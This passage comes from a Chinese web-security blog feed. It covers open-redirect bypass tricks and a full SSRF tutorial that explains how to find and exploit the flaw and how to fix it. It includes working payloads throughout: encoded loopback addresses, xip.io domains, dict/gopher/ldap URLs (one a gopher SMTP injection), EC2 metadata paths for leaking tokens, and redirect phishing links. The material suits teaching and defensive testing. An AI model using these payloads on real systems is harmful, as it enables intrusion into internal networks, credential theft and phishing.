这个绕过是在SSRF场景中的绕过，比如SSRF你要读取内网地址，一般都做了限制，可以尝试用这方法进行绕过限制，从而访问到内网。<br>另外一点，URL跳转涉及的安全问题大家常见的就是钓鱼，那么利用这个思路也可达成一个钓鱼问题，如，<a href="http://www.qq.com.127.0.0.1.xip.io" target="_blank" rel="noopener">http://www.qq.com.127.0.0.1.xip.io</a><br>当你访问qq这个域名时，其实这个链接已经被解析到后面这个ip地址上了，那么实际访问的就是后面这个IP地址。</font></li></ul><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H859abc96cb734526bc817af79bb78c37X.png" style="zoom:30%"></center></font></p><h3><span id="0x08-利用超链接绕过可信站点限制">0x08 利用超链接绕过可信站点限制</span></h3><ul><li><font face="微软雅黑">比如一个URL，它是可以直接跳转的，但是一般测试跳转时大家习惯用<a href="http://www.baidu.com或qq.com这样的可信站点进行测试，但是有些网站是可以跳转这些网站的。" target="_blank" rel="noopener">www.baidu.com或qq.com这样的可信站点进行测试，但是有些网站是可以跳转这些网站的。</a><br>只要是可信站点且常用，基本都可以跳转，那么这就属于正常的业务逻辑了，难道就这样错失一个URL跳转漏洞了？<br>其实不然，只要你的URL被百度收录过，那么直接搜索你的域名，site:xxx.xxx<br>因为你在百度里点击你的域名，它会先是一个302跳转，而这个302跳转就是百度下的302跳转，那么这样就可以绕过可信站点的限制，从而达到跳转到指定URL。<br>当然，百度这个302有点长，你给它进行加密就行。</font></li></ul><h3><span id="0x09-post参数中的url跳转">0x09 POST参数中的URL跳转</span></h3><ul><li><font face="微软雅黑">当然，这个影响就很小了，比如当你填什么表格或者需要填写什么的，当你上传图片，点击下一步的时候，通常下一步就是预览你填写的信息，最后才是提交。<br>当你上传了图片后点击下一步抓包，如果过滤不严，你会看到图片的完整地址包含在POST参数里，你就可以直接修改这个地址为任意URL，然后到达下一步。<br>这时是确定信息也就是预览自己填写的信息的正确还是不正确，由于你刚刚修改了图片地址，这里是没有显示出来的，图像会是一个小XX。<br>当点击图片右键选择查看图像时，就会触发URL跳转问题，其实这个也可以利用来进行钓鱼，钓后台审核员的信息。<br>为什么呢，比如审核看到图片无法加载，一般都会点击查看图片，然后跳转，如果安全意识不知就会造成安全影响。<br>当然，如果POST参数里就只是URL跳转参数，那么你可以给它转成GET方式，然后进行跳转就可以了，只要网站支持这样的GET方式就行。<br>在Burp Suite里可以一键转换提交方式，右键选择Change request method就可以！</font></li></ul><h3><span id="0x10-利用号绕过">0x10 利用#号绕过</span></h3><ul><li><font face="微软雅黑">如：<a href="http://www.aaa.com/acb?Url=http://test.com#login.aaa.com" target="_blank" rel="noopener">http://www.aaa.com/acb?Url=http://test.com#login.aaa.com</a></font></li></ul><h3><span id="0x09-fuzz">0x09 FUZZ</span></h3><ul><li><font face="微软雅黑">重定向Payloads by @cujanovic<br><a href="https://github.com/cujanovic/Open-Redirect-Payloads" target="_blank" rel="noopener">https://github.com/cujanovic/Open-Redirect-Payloads</a></font></li><li><font face="微软雅黑">重定向参数 by @fuzzdb-project<br><a href="https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt</a></font></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-如何绕过url限制&quot;&gt;1、如何绕过URL限制&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-描述&quot;&gt;1.1、描述：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12-正常思路&quot;&gt;1.2、正常思路：&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SSRF绕过的方法</title>
    <link href="http://www.vkxss.top/2019/07/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SSRF%E7%BB%95%E8%BF%87%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://www.vkxss.top/2019/07/19/渗透测试-SSRF绕过的方法/</id>
    <published>2019-07-19T06:25:40.000Z</published>
    <updated>2019-10-17T14:57:40.371Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-ssrf">1、SSRF</a><ul><li><a href="#11-描述">1.1、描述：</a></li><li><a href="#12-漏洞寻找">1.2、漏洞寻找：</a></li><li><a href="#13-漏洞验证">1.3 漏洞验证</a></li><li><a href="#14-利用方式">1.4 利用方式</a></li><li><a href="#15-漏洞利用示例">1.5、漏洞利用示例：</a></li><li><a href="#16-bypass">1.6、Bypass</a></li><li><a href="#17-ssrf危害">1.7 SSRF危害</a></li><li><a href="#18-漏洞修复">1.8 漏洞修复</a></li><li><a href="#19-参考文章">1.9 参考文章</a></li></ul></li></ul><!-- tocstop --><h1><span id="1-ssrf">1、SSRF</span></h1><h2><span id="11-描述">1.1、描述：</span></h2><ul><li><font face="微软雅黑">SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</font></li></ul><h2><span id="12-漏洞寻找">1.2、漏洞寻找：</span></h2><ul><li><p><font face="微软雅黑">分享功能，通过 URL 地址分享网页内容</font></p><p>  <font face="微软雅黑">早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的<tilte>标签或者<meta name="description" content="“”/">标签中content的文本内容作为显示以提供更好的用户体验</tilte></font></p></li><li><p><font face="微软雅黑">转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</font></p><p>  <font face="微软雅黑">由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务</font></p></li><li><p><font face="微软雅黑">在线翻译：通过URL地址翻译对应文本的内容。</font></p><p>  <font face="微软雅黑">提供此功能的国内公司有百度、有道等</font></p></li><li><p><font face="微软雅黑">图片加载与下载：通过URL地址加载或下载图片</font></p><p><font face="微软雅黑">图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，所以就可能造成SSRF问题）</font></p></li><li><p><font face="微软雅黑">图片、文章收藏功能<br>  <font face="微软雅黑">此处的图片、文章收藏中的文章收藏就类似于功能一、分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载</font></font></p></li><li><p><font face="微软雅黑">未公开的api实现以及其他调用URL的功能</font></p><p>  <font face="微软雅黑">此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</font></p></li><li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p></li><li><p>邮件系统：比如接收邮件服务器地址</p></li><li><p>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p></li><li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p></li><li><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p></li><li><p>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p></li><li><p>web钩子：寻找触发特定事件时发出http请求的服务。在大多数web钩子的功能中，终端用户可以选择他们的终端点和主机名。尝试向内部服务发送http请求。</p></li><li><p>文档解析器：尝试了解文档是如何被解析的。如果是XML文档，那就是用了PDF生成器方法。对于其他文档，检查是否存在引用外部资源的方法然后通过服务器向内部服务发送请求。</p></li><li><p>链接扩展: 最近Mark Litchfield在推特扩展链接上发现了漏洞，名声大涨。</p></li><li><p>文件上传：与常规上传文件相反，尝试发送url请求然后检查是否下载了url的内容。<a href="https://hackerone.com/reports/713" target="_blank" rel="noopener">例子</a></p></li><li><p>PDF生成器：试着注入指向内部服务的<code>&lt;iframe&gt;&lt;img&gt;,&lt;base&gt;或者&lt;script&gt;</code>元素或者CSS的url()函数。</p></li></ul><h2><span id="13-漏洞验证">1.3 漏洞验证</span></h2><ul><li>排除法：浏览器f12查看源代码看是否是在本地进行了请求</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如：该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</span><br></pre></td></tr></table></figure><ul><li>dnslog等工具进行测试，看是否被访问</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</span><br></pre></td></tr></table></figure><ul><li>抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</span><br><span class="line">通过二级域名暴力猜解工具模糊猜测内网地址</span><br></pre></td></tr></table></figure><ul><li><p>直接返回的Banner、title、content等信息</p></li><li><p>留意bool型SSRF</p></li></ul><h2><span id="14-利用方式">1.4  利用方式</span></h2><ul><li><p>让服务端去访问相应的网址</p></li><li><p>让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p></li><li><p>可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p></li><li><p>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p></li><li><p>攻击内网应用程序（利用跨协议通信技术）</p></li><li><p>判断内网主机是否存活：方法是访问看是否有端口开放</p></li></ul><p>​- 某些时候SSRF漏洞可以用作局域网内的端口扫描。这有助于理清内网的基础设施轮廓和并为下一步其他漏洞的利用做铺垫。上述这种情况通常是最简单的blind SSRF了。如果之前的脚本无法建立连接或收不到服务器响应，异常将被抛出。利用这个特征可以识别端口是否开放（连接建立）或关闭（连接失败或超时）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL parameterResponse HTTP statusRTTConclusion</span><br><span class="line">http://127.0.0.1:2220010msPort is open</span><br><span class="line">http://127.0.0.1:2350010msPort is closed</span><br><span class="line">http://10.0.0.1/50030010msFirewalled or unable to route traffic to server</span><br><span class="line">http://10.0.0.1:8080/50010msPort is closed and traffic is routed to server</span><br></pre></td></tr></table></figure><ul><li><p>对于开放和关闭的端口，每个SSRF响应都不同。试着以不同的响应为基础建立一个开放、闭合端口和标志符之间的映射。上面的表格就是一个例子。</p></li><li><p>DoS攻击（请求大文件，始终保持连接keep-alive always）</p></li><li><p>提取EC2配置文件<br>  越来越多的公司将部分基础设施放到亚马逊的EC2服务器上。亚马逊公开内部服务，每台EC实例都能查询主机元数据。这是AWS文档。如果你在EC2上发现了SSRF漏洞，试着请求<a href="http://169.254.169.254/latest/meta-data。响应会提供许多有用的信息便于对基础设施有一定的了解，甚至可能会泄漏亚马逊S3的访问token，API" target="_blank" rel="noopener">http://169.254.169.254/latest/meta-data。响应会提供许多有用的信息便于对基础设施有一定的了解，甚至可能会泄漏亚马逊S3的访问token，API</a> token等等。你也可以下载_ <a href="http://169.254.169.254/latest/user-data_和解压数据。" target="_blank" rel="noopener">http://169.254.169.254/latest/user-data_和解压数据。</a></p></li></ul><h2><span id="15-漏洞利用示例">1.5、漏洞利用示例：</span></h2><ul><li><p><font face="微软雅黑">某度翻译SSRF：<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hbf43dfb33cbc43939b24042c7530c24fR.jpg" style="zoom:50%"></center><br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H8a618cf2914f452aa323c5c7e921d91c9.jpg" style="zoom:50%"></center></font></font></font></p></li><li><p><font face="微软雅黑">某短网址SSRF：<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H8595608792b545259736dcaa13594142U.jpg" style="zoom:50%"></center></font></font></p></li></ul><p><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/Hb286c698c7a44e9fa59db20af8adfc82L.jpg" style="zoom:50%"></center></font></p><h2><span id="16-bypass">1.6、Bypass</span></h2><ul><li><font face="微软雅黑">1.4.1 攻击本地</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://localhost:22</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.2利用[::]</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用[::]绕过localhost</span><br><span class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br><span class="line">也有看到利用http://0000::1:80/的，但是我测试未成功</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.3利用@</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com@127.0.0.1</span><br><span class="line">http://A.com:B@127.0.0.1</span><br><span class="line">127.0.0.1#http://abc</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.4利用短地址</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）百度短网址转换：https://dwz.cn#不支持ip</span><br><span class="line">    http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</span><br><span class="line">    </span><br><span class="line">（2）TinyURL：https://tinyurl.com/create.php#支持ip</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.5利用特殊域名</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">利用的原理是DNS解析</span><br><span class="line">http://127.0.0.1.xip.io/</span><br><span class="line">http://www.owasp.org.127.0.0.1.xip.io/</span><br><span class="line">http://mysite.127.0.0.1.xip.io</span><br><span class="line">http://foo.bar.127.0.0.1.xip.io</span><br><span class="line">#利用</span><br><span class="line">ssrf.php?url=http://127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=http://www.127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=http://evi1.cn.127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=dict://evi1.cn.127.0.0.1.xip.io:22/info</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.6 利用DNS解析</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域名上设置A记录，指向127.0.1</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.7 利用上传</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">也不一定是上传，我也说不清，自己体会 -.-</span><br><span class="line">修改&quot;type=file&quot;为&quot;type=url&quot;</span><br><span class="line">比如：</span><br><span class="line">上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</span><br></pre></td></tr></table></figure><ul><li><p><a href="https://hackerone.com/reports/713" target="_blank" rel="noopener">例子</a></p></li><li><p><font face="微软雅黑">1.4.8 利用Enclosed alphanumerics</font></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  http://example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.9 利用句号</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127。0。0。1  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.10 利用进制转换<br>  – IP进制转换地址：<a href="../../../../scale.html">转换地址</a></font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">可以是十六进制，八进制等。</span><br><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">首先把这四段数字给分别转成16进制，结果：73 ef d2 1a</span><br><span class="line">然后把 73efd21a 这十六进制一起转换成8进制</span><br><span class="line">记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</span><br><span class="line"></span><br><span class="line">IP转换为-16进制-记得访问的时候加0X表示使用16进制</span><br><span class="line">http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://0X7F000001</span><br><span class="line"></span><br><span class="line">IP转换为-16进制-转换为八进制-记得访问的时候加0表示使用八进制</span><br><span class="line">http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://17700000001&gt;&gt;&gt;http://017700000001</span><br><span class="line"></span><br><span class="line">127转换为8进制：</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</span><br><span class="line"></span><br><span class="line">ip地址转换为10进制：</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</span><br><span class="line">http://192.168.0.1  &gt;&gt;&gt;  http://3232235521/</span><br><span class="line">http://192.168.1.1  &gt;&gt;&gt;  http://3232235777/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#ip:127.0.0.1</span><br><span class="line"></span><br><span class="line">（1）8进制格式：0177.0.0.1</span><br><span class="line">（2）16进制格式：0x7F.00.00.01</span><br><span class="line">（3）8进制整数格式：017700000001</span><br><span class="line">（3）10进制整数格式：2130706433</span><br><span class="line">（4）16进制整数格式：0x7f000001</span><br><span class="line"></span><br><span class="line">#转换方法</span><br><span class="line"></span><br><span class="line">8进制前加0，16进制前加0x</span><br><span class="line">将ip的每一位由十进制转换为二进制，再将二进制转换为八进制或十六进制</span><br><span class="line">关于整数格式：ipv4是32位二进制数，将其转换为32位二进制数，再将其转换为十进制或十六进制</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.11 利用特殊地址</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0/</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.12 利用协议</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict://</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">Gopher://</span><br><span class="line">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.13 利用301或者302跳转</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.th1s.cn/test/ssrf.php</span><br><span class="line">ssrf.php里面的内容为：</span><br><span class="line">&lt;?php header(&apos;Location:10.1.1.1&apos;);?&gt;</span><br></pre></td></tr></table></figure><ul><li><font face="微软雅黑">1.4.14 使用组合</font></li></ul><p>各种绕过进行自由组合即可</p><p>参考链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</span><br><span class="line">https://twitter.com/albinowax/status/890725759861403648</span><br><span class="line">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</span><br><span class="line">https://hackerone.com/reports/115748</span><br><span class="line">https://www.dailysecurity.fr/server-side-request-forgery/</span><br><span class="line">https://twitter.com/EdOverflow</span><br><span class="line">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection</span><br><span class="line">http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf</span><br><span class="line">http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</span><br><span class="line">http://blog.csdn.net/xinianbuxiu/article/details/53560417</span><br></pre></td></tr></table></figure><h2><span id="17-ssrf危害">1.7 SSRF危害</span></h2><ul><li>主机本地敏感信息读取， 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的Banner信息。</li><li>攻击运行在内外网主机的应用程序。</li><li>通过访问默认文件对内网 Web 应用进行指纹识别。</li><li>攻击内外网的 Web 应用，主要是使用 GET参数就可以实现的攻击。</li><li>利用file协议读取本地文件。</li></ul><h2><span id="18-漏洞修复">1.8 漏洞修复</span></h2><ul><li><p>禁止302跳转</p></li><li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p></li><li><p>禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p></li><li><p>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p></li><li><p>限制请求的端口为http常用的端口，比如 80、443、8080、8090</p></li><li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p></li></ul><h2><span id="19-参考文章">1.9 参考文章</span></h2><ul><li><a href="https://www.evi1.cn/post/ssrf/" target="_blank" rel="noopener">SSRF学习笔记</a></li><li><a href="https://www.evi1.cn/post/ssrf/" target="_blank" rel="noopener">ssrf攻击内网应用</a></li><li><a href="https://v0w.top/2018/11/23/SSRF-notes/#Some-Tricks-in-SSRF" target="_blank" rel="noopener">SSRF 学习笔记</a></li><li><a href="https://www.jianshu.com/p/949a2cb3be36?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">gopher 协议攻击内网 mysql</a></li><li><a href="https://www.smi1e.top/gopher-ssrf攻击内网应用复现/" target="_blank" rel="noopener">gopher SSRF攻击内网应用复现</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-ssrf&quot;&gt;1、SSRF&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-描述&quot;&gt;1.1、描述：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12-漏洞寻找&quot;&gt;1.2、漏洞寻找：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
